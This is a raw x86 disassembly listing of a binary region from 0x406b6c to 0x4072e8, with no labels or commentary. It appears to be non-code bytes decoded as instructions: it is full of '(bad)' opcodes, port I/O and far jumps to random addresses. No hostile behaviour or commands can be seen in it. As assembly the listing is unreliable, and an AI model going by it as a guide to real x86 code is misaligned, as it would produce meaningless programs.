  406b6c:	cmp    BYTE PTR [edx],dh
  406b6e:	stos   BYTE PTR es:[edi],al
  406b6f:	inc    ebx
  406b70:	mov    dh,0xf
  406b72:	or     al,0xa0
  406b74:	or     al,0x5b
  406b76:	(bad)  
  406b77:	jl     0x406b85
  406b79:	loop   0x406ba4
  406b7b:	pop    eax
  406b7c:	sti    
  406b7d:	lea    ecx,[ebp+0x55cffa70]
  406b83:	mov    al,ds:0xb96b9347
  406b88:	mov    ch,0xe1
  406b8a:	lods   eax,DWORD PTR ds:[esi]
  406b8b:	stos   DWORD PTR es:[edi],eax
  406b8c:	pop    ss
  406b8d:	pop    eax
  406b8e:	(bad)  
  406b8f:	imul   edi,DWORD PTR [ebx+ecx*2],0x7c
  406b93:	bound  esp,QWORD PTR [edx]
  406b95:	out    0xef,eax
  406b97:	push   ds
  406b98:	xchg   ebx,eax
  406b99:	out    0x58,al
  406b9b:	xchg   esp,eax
  406b9c:	sbb    bl,bh
  406b9e:	ret    0x2a93
  406ba1:	sbb    al,0xe2
  406ba3:	leave  
  406ba4:	ror    BYTE PTR [ebp+0x6f1341d9],0x4b
  406bab:	ins    DWORD PTR es:[edi],dx
  406bac:	mov    dl,0xbe
  406bae:	dec    ebx
  406baf:	add    bh,BYTE PTR [edi+eax*4+0x1e]
  406bb3:	or     ecx,DWORD PTR [ecx]
  406bb5:	cdq    
  406bb6:	sbb    ecx,esi
  406bb8:	mov    esp,esi
  406bba:	mov    edi,0xeadca5d4
  406bbf:	gs jns 0x406c38
  406bc2:	push   eax
  406bc3:	push   cs
  406bc4:	xchg   edx,eax
  406bc5:	js     0x406b9e
  406bc7:	xor    BYTE PTR [ebx],0x75
  406bca:	xchg   ebx,eax
  406bcb:	ret    
  406bcc:	mov    dl,BYTE PTR [ecx-0x209374d2]
  406bd2:	jne    0x406b90
  406bd4:	jmp    DWORD PTR [ebx+0x56a61389]
  406bda:	int3   
  406bdb:	scas   eax,DWORD PTR es:[edi]
  406bdc:	sub    DWORD PTR [ebx+0x4c],ecx
  406bdf:	daa    
  406be0:	dec    edi
  406be1:	inc    edi
  406be2:	retf   0x4261
  406be5:	add    bl,BYTE PTR [ecx-0x6d76ffad]
  406beb:	adc    ah,BYTE PTR fs:[ebx-0x57]
  406bef:	mov    eax,ds:0xdcabd399
  406bf4:	jnp    0x406bb2
  406bf6:	pop    ds
  406bf7:	or     ebx,DWORD PTR [eax]
  406bf9:	jecxz  0x406bf5
  406bfb:	dec    esp
  406bfc:	inc    BYTE PTR [eax]
  406bfe:	fwait
  406bff:	xchg   edx,eax
  406c00:	mov    edi,0xffee54f1
  406c05:	gs mov ebx,0xc2fb4662
  406c0b:	clc    
  406c0c:	popa   
  406c0d:	rcl    ebx,cl
  406c0f:	sbb    ebp,DWORD PTR [esi]
  406c11:	mov    ebp,0xd30b83db
  406c16:	pop    ecx
  406c17:	jmp    0xbf88a1fc
  406c1c:	jp     0x406bdb
  406c1e:	shr    BYTE PTR [ebx+0x6a],cl
  406c21:	into   
  406c22:	jmp    0x406c70
  406c24:	rcl    edi,0xb1
  406c27:	call   0x4ac1af48
  406c2c:	and    al,BYTE PTR [ebx+0x47]
  406c2f:	arpl   si,di
  406c31:	jns    0x406c0b
  406c33:	inc    esp
  406c34:	fbstp  TBYTE PTR [ecx+0x72]
  406c37:	in     eax,0x1e
  406c39:	ins    DWORD PTR es:[edi],dx
  406c3a:	mov    edx,edi
  406c3c:	xchg   edx,eax
  406c3d:	dec    edx
  406c3e:	inc    edx
  406c3f:	pop    edi
  406c40:	mov    dh,0x4f
  406c42:	jno    0x406c25
  406c44:	jns    0x406c6b
  406c46:	cmc    
  406c47:	add    edi,DWORD PTR [edi-0x3a]
  406c4a:	mov    ebx,0xadb8e02e
  406c4f:	pop    ss
  406c50:	je     0x406ca8
  406c52:	lds    ebx,FWORD PTR [edx+edx*2+0x5ddb73c1]
  406c59:	jecxz  0x406c46
  406c5b:	mov    eax,ds:0x839b928a
  406c60:	bound  ebp,QWORD PTR [eax]
  406c62:	add    ch,BYTE PTR [edi]
  406c64:	pusha  
  406c65:	in     eax,0x1e
  406c67:	ret    0xe7d9
  406c6a:	and    ah,BYTE PTR [esi-0x3e]
  406c6d:	fwait
  406c6e:	je     0x406c52
  406c70:	add    dl,BYTE PTR [esi+0x5c]
  406c73:	loop   0x406c76
  406c75:	xchg   DWORD PTR [esi+0x66],edx
  406c78:	xor    ebp,esp
  406c7a:	add    esi,DWORD PTR [eax+0x22c1e9b2]
  406c80:	pop    es
  406c81:	mov    DWORD PTR [esi+ebx*2],edx
  406c84:	enter  0xf699,0x6
  406c88:	cli    
  406c89:	push   eax
  406c8a:	xchg   DWORD PTR [edx],esp
  406c8c:	adc    bh,ah
  406c8e:	mov    al,ds:0x419eefb1
  406c93:	xchg   DWORD PTR [ecx+ebx*2],ecx
  406c96:	adc    DWORD PTR [ebp-0x54],ecx
  406c99:	leave  
  406c9a:	mov    ecx,0x7b7bedee
  406c9f:	xor    al,0x1a
  406ca1:	mov    al,0x5f
  406ca3:	cli    
  406ca4:	bound  eax,QWORD PTR [ebx-0x4acb8671]
  406caa:	mov    cl,0x41
  406cac:	clc    
  406cad:	mov    ecx,0x365e1ecc
  406cb2:	out    0x5b,eax
  406cb4:	add    BYTE PTR [ecx],bl
  406cb6:	lods   eax,DWORD PTR ds:[esi]
  406cb7:	outs   dx,DWORD PTR ds:[esi]
  406cb8:	loopne 0x406d38
  406cba:	dec    edx
  406cbb:	repz xchg ebp,eax
  406cbd:	ja     0x406cc7
  406cbf:	jmp    0x406cd6
  406cc1:	inc    sp
  406cc3:	js     0x406d35
  406cc5:	test   al,0x61
  406cc7:	adc    esp,ebx
  406cc9:	and    DWORD PTR [ebx+0x63],0x37
  406ccd:	jb     0x406ccb
  406ccf:	in     al,0xbd
  406cd1:	sub    dl,dh
  406cd3:	xchg   ebp,eax
  406cd4:	cmp    eax,0xa8744a32
  406cd9:	inc    ebx
  406cda:	mov    bh,0xee
  406cdc:	(bad)  
  406cde:	mov    esi,0xce29213a
  406ce3:	scas   al,BYTE PTR es:[edi]
  406ce4:	jle    0x406ce0
  406ce6:	dec    edi
  406ce7:	mov    ah,0x28
  406ce9:	jnp    0x406c91
  406ceb:	(bad)  
  406cec:	mov    ebx,0xd8560d90
  406cf1:	lods   al,BYTE PTR ds:[esi]
  406cf2:	xlat   BYTE PTR ds:[ebx]
  406cf3:	stc    
  406cf4:	sbb    bl,BYTE PTR [esi]
  406cf6:	or     eax,0xfd51ff5f
  406cfb:	dec    eax
  406cfc:	lods   al,BYTE PTR ds:[esi]
  406cfd:	pop    edi
  406cfe:	sbb    DWORD PTR [ebp+0x33],esp
  406d01:	sbb    edi,DWORD PTR [si+0x5fb0]
  406d06:	sub    ch,ah
  406d08:	sub    al,0x52
  406d0a:	mov    ds:0xc89264ef,eax
  406d0f:	ins    DWORD PTR es:[edi],dx
  406d10:	pop    esp
  406d11:	mov    ah,0x1e
  406d13:	adc    eax,0xe125624d
  406d18:	pop    edi
  406d1a:	mov    WORD PTR [edx+edi*2+0x37355932],ss
  406d21:	add    eax,0x49e3354f
  406d26:	paddb  mm4,QWORD PTR [edx+0x28b809ec]
  406d2d:	call   0xb2440591
  406d32:	iret   
  406d33:	cmp    edx,DWORD PTR [esi-0x106fea6b]
  406d39:	ret    0x62f
  406d3c:	xor    al,0x51
  406d3e:	adc    esp,DWORD PTR [ecx]
  406d40:	sbb    edx,DWORD PTR [ecx-0x5d]
  406d43:	fcomp  QWORD PTR [ebx]
  406d45:	rcr    BYTE PTR [eax-0x74d232f0],cl
  406d4b:	jge    0x406cd4
  406d4d:	add    ebp,esp
  406d4f:	fcomip st,st(0)
  406d51:	in     al,0x2f
  406d53:	mov    al,0x8b
  406d55:	das    
  406d56:	xor    eax,0xe1c5c84e
  406d5b:	dec    eax
  406d5c:	mov    al,ds:0x4c80577c
  406d61:	xor    bh,BYTE PTR [edx]
  406d63:	pop    ebp
  406d64:	bound  ecx,QWORD PTR [ebx]
  406d66:	sub    BYTE PTR [eax],cl
  406d68:	pop    ecx
  406d69:	sti    
  406d6a:	sahf   
  406d6b:	scas   al,BYTE PTR es:[edi]
  406d6c:	jl     0x406da6
  406d6e:	mov    ebx,0x72e29568
  406d73:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406d74:	pop    ss
  406d75:	cmp    dh,BYTE PTR [eax-0x3f]
  406d78:	cwde   
  406d79:	sar    edi,cl
  406d7b:	outs   dx,BYTE PTR ds:[esi]
  406d7c:	cs push 0x5988e67e
  406d82:	test   BYTE PTR [ebx+0x77f6380c],dh
  406d88:	sub    esp,DWORD PTR [edx-0x6f830a53]
  406d8e:	retf   
  406d8f:	call   0x9ed49031
  406d94:	es or  al,0xdc
  406d97:	push   ebp
  406d98:	stos   DWORD PTR es:[edi],eax
  406d99:	loope  0x406dd0
  406d9b:	xchg   ecx,eax
  406d9c:	jp     0x406d28
  406d9e:	ja     0x406d9c
  406da0:	sub    DWORD PTR cs:[ebx-0x2f],ebx
  406da4:	xchg   edi,eax
  406da5:	scas   al,BYTE PTR es:[edi]
  406da6:	or     eax,0x1f3a334e
  406dab:	mov    cl,0xb6
  406dad:	cmp    eax,0x358b2614
  406db2:	mov    edi,0x745df306
  406db7:	and    DWORD PTR [ebx-0x3f],ebx
  406dba:	sub    al,0x1a
  406dbc:	jg     0x406d61
  406dbe:	call   0x1d7f:0xdb7ef9ee
  406dc5:	test   al,0xbb
  406dc7:	inc    ebx
  406dc8:	sub    BYTE PTR [edx],ch
  406dca:	fdivr  QWORD PTR [esi]
  406dcc:	inc    DWORD PTR [ebp-0x12]
  406dcf:	cs xor al,0x7e
  406dd2:	jo     0x406d95
  406dd4:	add    eax,0x8a3a511b
  406dd9:	xchg   esi,eax
  406dda:	jnp    0x406dcf
  406ddc:	xchg   BYTE PTR ds:0xb7bee513,dl
  406de2:	pusha  
  406de3:	(bad)  
  406de5:	xchg   ebx,eax
  406de6:	lea    ebx,[eax+0xb2f6d88]
  406dec:	inc    edi
  406ded:	add    ebx,DWORD PTR [ebp+0x372e7426]
  406df3:	outs   dx,BYTE PTR ds:[esi]
  406df4:	mov    eax,ds:0xaa2d6fb0
  406df9:	xor    DWORD PTR [ebp+0x1b],ebx
  406dfc:	add    dh,0xe6
  406dff:	inc    ebp
  406e00:	or     eax,0x77eedb72
  406e05:	and    BYTE PTR [edi],ch
  406e07:	in     al,0x6a
  406e09:	aaa    
  406e0a:	addr16 mov ah,0x34
  406e0d:	push   ss
  406e0e:	sub    DWORD PTR [ecx+esi*4+0x5f4d43d5],edi
  406e15:	and    DWORD PTR [esi],ecx
  406e17:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406e18:	push   0x20
  406e1a:	pop    ss
  406e1b:	and    al,0x19
  406e1d:	icebp  
  406e1e:	dec    edx
  406e1f:	fld    QWORD PTR [esi-0x10e59eb7]
  406e25:	lock pop eax
  406e27:	dec    ecx
  406e28:	(bad)  
  406e29:	sti    
  406e2a:	lods   al,BYTE PTR ds:[esi]
  406e2b:	ss pop esi
  406e2d:	xor    al,0x81
  406e2f:	add    BYTE PTR [eax+0x241be605],0x69
  406e36:	cmp    al,0x8a
  406e38:	xchg   esp,eax
  406e39:	add    ah,cl
  406e3b:	bound  ebp,QWORD PTR [esi+0x54]
  406e3e:	dec    ebp
  406e3f:	sbb    BYTE PTR [eax-0x63],dl
  406e42:	jge    0x406ddd
  406e44:	daa    
  406e45:	loop   0x406dd0
  406e47:	pop    ecx
  406e48:	(bad)  
  406e49:	xchg   ecx,eax
  406e4a:	pop    esp
  406e4b:	pop    ebp
  406e4c:	andps  xmm6,XMMWORD PTR [ebp+0x65e18381]
  406e53:	inc    esi
  406e54:	bound  esp,QWORD PTR [edi+0x21]
  406e57:	cld    
  406e58:	add    eax,DWORD PTR [ebx]
  406e5a:	xlat   BYTE PTR ds:[ebx]
  406e5b:	add    bl,BYTE PTR [eax]
  406e5d:	adc    BYTE PTR [esp+eiz*4+0x6261ffe3],0xb1
  406e65:	and    DWORD PTR ds:0xf3b48c32,0xffffffa4
  406e6c:	jmp    0x223454a9
  406e71:	adc    esi,ebp
  406e73:	dec    dx
  406e75:	or     ecx,eax
  406e77:	bound  esi,QWORD PTR [edi+0x60146266]
  406e7d:	repnz enter 0x1e39,0xdb
  406e82:	adc    DWORD PTR [edx-0x7b2387df],esi
  406e88:	mov    al,BYTE PTR [eax+0x3b]
  406e8b:	xchg   ebx,eax
  406e8c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406e8d:	(bad)  
  406e8e:	int3   
  406e8f:	mov    al,0x33
  406e91:	data16 xchg bh,cl
  406e94:	popf   
  406e95:	push   ebx
  406e96:	mov    esi,0xf95e8259
  406e9b:	push   edx
  406e9c:	and    DWORD PTR [edx],ebx
  406e9e:	pop    esp
  406e9f:	and    esi,DWORD PTR [ecx+edx*4]
  406ea2:	inc    eax
  406ea3:	sub    al,0x5e
  406ea5:	ret    0x341a
  406ea8:	repnz test al,0x61
  406eab:	lock dec eax
  406ead:	push   ss
  406eae:	pop    ebp
  406eaf:	or     DWORD PTR [edi+0x3],0x9f6004d8
  406eb6:	cwde   
  406eb7:	shl    BYTE PTR [edx-0xd],1
  406eba:	dec    edx
  406ebb:	mov    ss,WORD PTR [ebp-0x2e]
  406ebe:	stos   BYTE PTR es:[edi],al
  406ebf:	jp     0x406f1a
  406ec1:	ja     0x406e74
  406ec3:	and    bl,BYTE PTR [edx]
  406ec5:	inc    edx
  406ec6:	jp     0x406e82
  406ec8:	and    edi,DWORD PTR [edx+0x3a]
  406ecb:	dec    ecx
  406ecc:	pop    es
  406ecd:	pusha  
  406ece:	das    
  406ecf:	inc    esi
  406ed0:	aam    0x21
  406ed2:	sbb    eax,0xfd273eff
  406ed7:	(bad)
  406edc:	inc    eax
  406edd:	or     BYTE PTR [esi+0x6c],0x93
  406ee1:	(bad)  
  406ee2:	xor    DWORD PTR [ecx],edx
  406ee4:	in     eax,0x48
  406ee6:	jnp    0x406f0c
  406ee8:	jnp    0x406f45
  406eea:	test   al,0xee
  406eec:	inc    esp
  406eed:	(bad)  
  406eee:	mov    bh,bh
  406ef0:	aas    
  406ef1:	dec    esi
  406ef2:	fiadd  WORD PTR [ebp-0x1]
  406ef5:	mov    al,0x3c
  406ef7:	fsub   DWORD PTR [edx+0x7d]
  406efa:	in     eax,dx
  406efb:	or     eax,eax
  406efd:	hlt    
  406efe:	mov    al,ds:0x92029fc2
  406f03:	xchg   esp,eax
  406f04:	jecxz  0x406ea4
  406f06:	or     eax,0xa31cafd
  406f0b:	jp     0x406ec0
  406f0d:	sub    bh,BYTE PTR [edi]
  406f0f:	sbb    dh,dl
  406f11:	retf   
  406f12:	jmp    0x406ea3
  406f14:	gs je  0x406ebb
  406f17:	jno    0x406f19
  406f19:	mov    edx,0x5b080270
  406f1e:	xor    eax,0x7ba95543
  406f23:	push   es
  406f24:	fcmovnb st,st(3)
  406f26:	xor    DWORD PTR [ecx+eiz*8],esp
  406f29:	data16 mov ah,0xcd
  406f2c:	inc    edx
  406f2d:	ins    BYTE PTR es:[edi],dx
  406f2e:	xchg   DWORD PTR [edx+0x3d751d3a],edx
  406f34:	lds    esi,FWORD PTR [ebx*2+0x2bf79464]
  406f3b:	add    ah,BYTE PTR [edi]
  406f3d:	bound  ebp,QWORD PTR [ecx-0x4e]
  406f40:	mul    DWORD PTR [esi+0x755b7be4]
  406f46:	or     dh,ch
  406f48:	daa    
  406f49:	cli    
  406f4a:	cmp    al,0x94
  406f4c:	lods   al,BYTE PTR ds:[esi]
  406f4d:	mov    WORD PTR [edi],gs
  406f4f:	xor    eax,0x65abe3f4
  406f54:	dec    esp
  406f55:	loope  0x406f09
  406f57:	ficom  WORD PTR [esi-0x37]
  406f5a:	cwde   
  406f5b:	and    bl,dl
  406f5d:	stos   BYTE PTR es:[edi],al
  406f5e:	out    0x46,al
  406f60:	jg     0x406ef7
  406f62:	jle    0x406f8d
  406f64:	int    0x16
  406f66:	lods   al,BYTE PTR ds:[esi]
  406f67:	pop    ebx
  406f68:	xchg   DWORD PTR [ebx],ebx
  406f6a:	xor    al,0xb3
  406f6c:	in     eax,0xf4
  406f6e:	sub    cl,BYTE PTR [edi]
  406f70:	fdiv   st,st(0)
  406f72:	mov    ebx,DWORD PTR [edx-0x14c49b38]
  406f78:	adc    eax,0x62e0cdbe
  406f7d:	push   0xffffff9f
  406f7f:	push   cs
  406f80:	std    
  406f81:	call   0x4580:0x92c0cb6a
  406f88:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406f89:	xor    DWORD PTR [ecx],0x3ef4bdba
  406f8f:	popa   
  406f90:	test   eax,0xd229c853
  406f95:	dec    esi
  406f96:	fbstp  TBYTE PTR [ebp+0x1]
  406f99:	push   0xffffff87
  406f9b:	push   ecx
  406f9c:	clc    
  406f9d:	pop    es
  406f9e:	mov    WORD PTR [edi-0x69],fs
  406fa1:	sub    DWORD PTR [ecx],ecx
  406fa3:	push   edi
  406fa4:	(bad)  
  406fa5:	dec    eax
  406fa6:	mov    dl,0x1a
  406fa8:	and    al,0x8d
  406faa:	les    esi,FWORD PTR [eax]
  406fac:	jmp    FWORD PTR [ebp+0x7]
  406faf:	movs   BYTE PTR es:[edi],BYTE PTR cs:[esi]
  406fb1:	mov    edx,0x45ff1a2c
  406fb6:	inc    eax
  406fb7:	mov    dl,dl
  406fb9:	retf   
  406fba:	mov    DWORD PTR [ebp-0x51b5cc0f],ebx
  406fc0:	lds    edx,FWORD PTR [ebp-0x79a7789f]
  406fc6:	pop    edx
  406fc7:	cmp    al,0x56
  406fc9:	out    dx,al
  406fca:	pop    ss
  406fcb:	lods   al,BYTE PTR ds:[esi]
  406fcc:	inc    ebx
  406fcd:	fbstp  TBYTE PTR [ecx+0x69]
  406fd0:	enter  0x23d4,0xe
  406fd4:	pop    ss
  406fd5:	jo     0x406fbd
  406fd7:	idiv   ebp
  406fd9:	nop
  406fda:	add    BYTE PTR [ebx-0x79],dh
  406fdd:	or     bl,BYTE PTR [edi]
  406fdf:	shl    ebx,cl
  406fe1:	jmp    0x4b31:0x4a6939c9
  406fe8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406fe9:	pop    ebx
  406fea:	fld    TBYTE PTR [ebx-0x6004cb0d]
  406ff0:	mov    ebx,0x9a108d84
  406ff5:	dec    esp
  406ff6:	dec    ecx
  406ff7:	fimul  WORD PTR [eax-0x7e3f511f]
  406ffd:	push   0xffffff93
  406fff:	pop    ecx
  407000:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407001:	push   0xf7bba582
  407006:	test   bh,cl
  407008:	imul   edi,DWORD PTR [ecx+0x30caa70b],0xc8e318ae
  407012:	sar    DWORD PTR [ecx+eax*1+0x14de17cc],0xd0
  40701a:	sbb    ebx,esp
  40701c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40701d:	ds cmc 
  40701f:	add    bh,BYTE PTR [ebx+0xc]
  407022:	int    0xa1
  407024:	or     ch,BYTE PTR [edx-0x304bf665]
  40702a:	out    0x7d,eax
  40702c:	aam    0x69
  40702e:	das    
  40702f:	cmp    al,0x37
  407031:	ds push esi
  407033:	inc    ebx
  407034:	test   al,0xbd
  407036:	mov    dl,0x5b
  407038:	add    al,0xc5
  40703b:	xchg   esi,eax
  40703c:	ins    BYTE PTR es:[edi],dx
  40703d:	sbb    al,0x7e
  40703f:	in     eax,0xcb
  407041:	push   ds
  407042:	mov    eax,ds:0xd7f25a4d
  407047:	idiv   ah
  407049:	inc    esp
  40704a:	aas    
  40704b:	rcl    BYTE PTR [eax],0x13
  40704e:	xor    al,0xea
  407050:	enter  0x2e46,0x8
  407054:	inc    esp
  407055:	push   DWORD PTR [ebp-0x59d28a8f]
  40705b:	xor    BYTE PTR [ecx],ah
  40705d:	rol    dh,cl
  40705f:	sbb    eax,0x459acedb
  407064:	in     eax,0x20
  407066:	push   esp
  407067:	or     bl,bl
  407069:	inc    edi
  40706a:	sbb    BYTE PTR [eax],dh
  40706c:	ja     0x40700f
  40706e:	aam    0xe6
  407070:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407071:	sbb    al,0x6f
  407073:	les    eax,FWORD PTR [edx-0x55]
  407076:	xchg   edi,eax
  407077:	mov    es,WORD PTR [eax-0x6b]
  40707a:	outs   dx,BYTE PTR ds:[esi]
  40707b:	shl    DWORD PTR [edx],cl
  40707d:	mov    eax,ds:0x61240008
  407082:	add    eax,esi
  407084:	aaa    
  407085:	jo     0x4070f4
  407087:	push   ebp
  407088:	dec    edi
  407089:	dec    esi
  40708a:	mov    ebx,0x8a3e060e
  40708f:	les    esi,FWORD PTR [eax+0x75e492]
  407095:	test   DWORD PTR [edi-0x1ba9693d],esi
  40709b:	jmp    0x407095
  40709d:	pop    ss
  40709e:	and    BYTE PTR [eax+ecx*1-0x9],cl
  4070a2:	jns    0x407114
  4070a4:	iret   
  4070a5:	daa    
  4070a6:	hlt    
  4070a7:	inc    esp
  4070a8:	retf   0x9cfb
  4070ab:	ret    
  4070ac:	sahf   
  4070ad:	dec    ebp
  4070ae:	in     al,dx
  4070af:	sar    ecx,0xc6
  4070b2:	fst    DWORD PTR [esi]
  4070b4:	adc    bh,BYTE PTR [ebx+0x2fb8a926]
  4070ba:	fistp  WORD PTR [esi-0x68f9f0ba]
  4070c0:	repz sbb eax,0x8300779f
  4070c6:	test   eax,0x9ff7cfc1
  4070cb:	into   
  4070cc:	mov    eax,0xa6c54799
  4070d1:	push   esp
  4070d2:	sub    al,0x34
  4070d4:	fld    QWORD PTR [ecx-0xea05016]
  4070da:	or     DWORD PTR [ebx+edx*1],esp
  4070dd:	push   ebx
  4070de:	sbb    al,0x9b
  4070e0:	push   ebp
  4070e1:	and    esp,ecx
  4070e3:	xchg   ecx,eax
  4070e4:	data16 xor bh,BYTE PTR [ecx+0x301008c6]
  4070eb:	and    eax,0xfbd606da
  4070f0:	xchg   esp,eax
  4070f1:	and    ebp,DWORD PTR [edi+0x4675adbe]
  4070f7:	push   cs
  4070f8:	into   
  4070f9:	mov    BYTE PTR [ecx],cl
  4070fb:	cmp    esp,DWORD PTR [ebp+0x3a]
  4070fe:	ins    DWORD PTR es:[edi],dx
  4070ff:	jb     0x40708c
  407101:	push   ecx
  407102:	je     0x4070ef
  407104:	and    bl,BYTE PTR [ecx]
  407106:	fmulp  st(2),st
  407108:	ret    0x1cf6
  40710b:	call   0xb3e347e9
  407110:	jnp    0x4070cd
  407112:	xchg   esi,eax
  407113:	inc    ebx
  407114:	sbb    esi,ebx
  407116:	and    al,0x3a
  407118:	sub    dh,dh
  40711a:	push   0x39
  40711c:	xor    ebx,0xffffffbc
  40711f:	pushf  
  407120:	aaa    
  407121:	mov    esp,0x8ec66a3d
  407126:	ret    
  407127:	push   ss
  407128:	or     bh,BYTE PTR [esp+eiz*2+0x8]
  40712c:	mov    ds:0xb84c106a,eax
  407131:	icebp  
  407132:	push   0x7a5cde05
  407137:	sbb    DWORD PTR [edx],esp
  407139:	push   edi
  40713a:	sub    al,0x3d
  40713c:	pop    eax
  40713d:	dec    ebp
  40713e:	mov    bl,0xbc
  407140:	int3   
  407141:	stos   BYTE PTR es:[edi],al
  407142:	ret    
  407143:	les    esp,FWORD PTR [ebx+0x7f]
  407146:	in     eax,dx
  407147:	push   edx
  407148:	push   esi
  407149:	inc    ebx
  40714a:	xchg   BYTE PTR [edx+0x78],bl
  40714d:	xor    al,0x7c
  40714f:	inc    edi
  407150:	aaa    
  407151:	dec    ecx
  407152:	retf   0xcf63
  407155:	pop    si
  407157:	or     al,0x34
  407159:	or     BYTE PTR [esi-0x15],cl
  40715c:	push   ebp
  40715d:	mov    gs,WORD PTR [ecx+eax*1+0x68]
  407161:	mov    cs,WORD PTR [esi+0x44]
  407164:	nop
  407165:	sbb    al,0x65
  407167:	pop    eax
  407168:	cmp    al,0x72
  40716a:	or     ch,BYTE PTR [eax-0x39]
  40716d:	mov    eax,ds:0xbb6ec6bd
  407172:	out    dx,eax
  407173:	mov    WORD PTR [edx+0x23323b80],cs
  407179:	push   0xffffff94
  40717b:	or     al,0x64
  40717d:	call   DWORD PTR [ebx]
  40717f:	jbe    0x40717d
  407181:	pushf  
  407182:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407183:	push   eax
  407184:	cli    
  407185:	xor    al,bh
  407187:	iret   
  407188:	outs   dx,DWORD PTR ds:[esi]
  407189:	mov    al,ds:0x64a494fb
  40718e:	stc    
  40718f:	test   al,0x25
  407191:	xor    bl,BYTE PTR [esi]
  407193:	ucomiss xmm3,DWORD PTR [ebp+0x42]
  407197:	sbb    bl,BYTE PTR es:[ebx+0x6bc43a89]
  40719e:	adc    eax,0xcc43b299
  4071a3:	cdq    
  4071a4:	ins    DWORD PTR es:[edi],dx
  4071a5:	push   es
  4071a6:	ret    
  4071a7:	or     BYTE PTR [ecx+0x5a057e33],bh
  4071ad:	add    eax,0xd88b9edd
  4071b2:	inc    DWORD PTR [di]
  4071b5:	add    eax,0x1168a0c
  4071ba:	pop    ebx
  4071bb:	int    0xa9
  4071bd:	retf   0xa0f5
  4071c0:	fcmovnbe st,st(1)
  4071c2:	xchg   BYTE PTR [ebp-0x63],bl
  4071c5:	pop    eax
  4071c6:	xor    DWORD PTR [ecx],0xb2ddb924
  4071cc:	xchg   ebp,eax
  4071cd:	and    eax,0x46b38a13
  4071d2:	mov    al,ds:0x198668ce
  4071d7:	pop    ecx
  4071d8:	push   ss
  4071d9:	push   cs
  4071da:	popf   
  4071db:	ret    
  4071dc:	outs   dx,BYTE PTR ds:[esi]
  4071dd:	iret   
  4071de:	xchg   ebp,eax
  4071df:	data16 fsubp st(0),st
  4071e2:	add    ah,BYTE PTR [eax-0x10]
  4071e5:	in     eax,0x77
  4071e7:	es hlt 
  4071e9:	mov    esi,DWORD PTR [edi-0x3e]
  4071ec:	mov    esi,0xb78f3d7
  4071f1:	mov    ebx,0x13a178ff
  4071f6:	das    
  4071f7:	pop    ecx
  4071f8:	cmp    eax,0xccf51ac4
  4071fd:	dec    esi
  4071fe:	jne    0x4071f0
  407200:	mov    esi,DWORD PTR [ebx+edi*8+0x7d]
  407204:	mov    al,0x71
  407206:	mov    eax,eax
  407208:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407209:	pusha  
  40720a:	push   ds
  40720b:	push   edx
  40720c:	dec    eax
  40720d:	ja     0x40723e
  40720f:	std    
  407210:	dec    esp
  407211:	xor    edi,DWORD PTR [eax-0x6b17c24f]
  407217:	out    dx,eax
  407218:	mov    edi,0xc9d5d2bc
  40721d:	clc    
  40721e:	xchg   ebp,eax
  40721f:	jg     0x407229
  407221:	push   eax
  407222:	jnp    0x407286
  407224:	dec    ebx
  407225:	inc    ebp
  407226:	or     al,0x36
  407228:	mov    esi,0x6b0cdbf0
  40722d:	cdq    
  40722e:	(bad)  
  407230:	xchg   BYTE PTR [edx+0x3],cl
  407233:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407234:	sub    bh,BYTE PTR [edx+0x2ac7332a]
  40723a:	dec    DWORD PTR [edi-0x30]
  40723d:	xor    DWORD PTR [ecx-0x7],0x2adb6070
  407244:	stc    
  407245:	adc    ah,bh
  407247:	(bad)  
  407248:	ins    BYTE PTR es:[edi],dx
  407249:	(bad)  
  40724a:	sub    bl,al
  40724c:	mov    ah,0xe0
  40724e:	jae    0x40728d
  407250:	pop    edi
  407251:	cmp    DWORD PTR [esp+esi*8],esi
  407254:	aas    
  407255:	add    BYTE PTR [ecx+0x5d],ah
  407258:	adc    ecx,DWORD PTR [eax+0x7740b269]
  40725e:	shld   DWORD PTR [esi+0x46],edi,0x28
  407263:	imul   ecx,DWORD PTR [ebp+0x3d2108d8],0xffffff9b
  40726a:	pop    ds
  40726b:	jl     0x407266
  40726d:	aam    0x95
  40726f:	cdq    
  407270:	mov    DWORD PTR [edx+0x3508f15c],0x7ad6f405
  40727a:	mov    ah,0x7a
  40727c:	dec    esi
  40727d:	pop    ecx
  40727e:	xchg   DWORD PTR [ecx-0x7156e935],edx
  407284:	pusha  
  407285:	mov    ah,BYTE PTR [ebp-0x6ab15acc]
  40728b:	mov    esp,0x260e9063
  407290:	mov    eax,0x924df1bb
  407295:	jecxz  0x4072dc
  407297:	xchg   BYTE PTR [esi],cl
  407299:	add    al,0x3c
  40729b:	jno    0x40729b
  40729d:	repnz cmp DWORD PTR [eax],ebx
  4072a0:	jecxz  0x407309
  4072a2:	or     eax,DWORD PTR [edx+0x7b8c0249]
  4072a8:	arpl   WORD PTR [edi-0x48b38a9b],di
  4072ae:	shl    DWORD PTR [edi+0x5cf2b604],cl
  4072b4:	mov    dh,0xff
  4072b6:	push   esp
  4072b7:	dec    edi
  4072b8:	add    BYTE PTR [eax],0x2d
  4072bb:	xchg   esi,eax
  4072bc:	je     0x4072a2
  4072be:	dec    esp
  4072bf:	mov    bh,0xed
  4072c1:	cmp    edi,DWORD PTR [esi-0x5d311e28]
  4072c7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4072c8:	outs   dx,DWORD PTR ds:[esi]
  4072c9:	push   0x67
  4072cb:	or     ch,0x56
  4072ce:	xor    DWORD PTR [esi],eax
  4072d0:	in     eax,dx
  4072d1:	mov    al,0xce
  4072d3:	ret    0x427d
  4072d6:	push   0x57e31c0c
  4072db:	loopne 0x407277
  4072dd:	dec    DWORD PTR [ebx+0x1e]
  4072e0:	cmp    DWORD PTR [eax+0x7c],edi
  4072e3:	add    esi,DWORD PTR [ebx-0x75]
  4072e6:	jp     0x407327
  4072e8:	ffree  st(6)
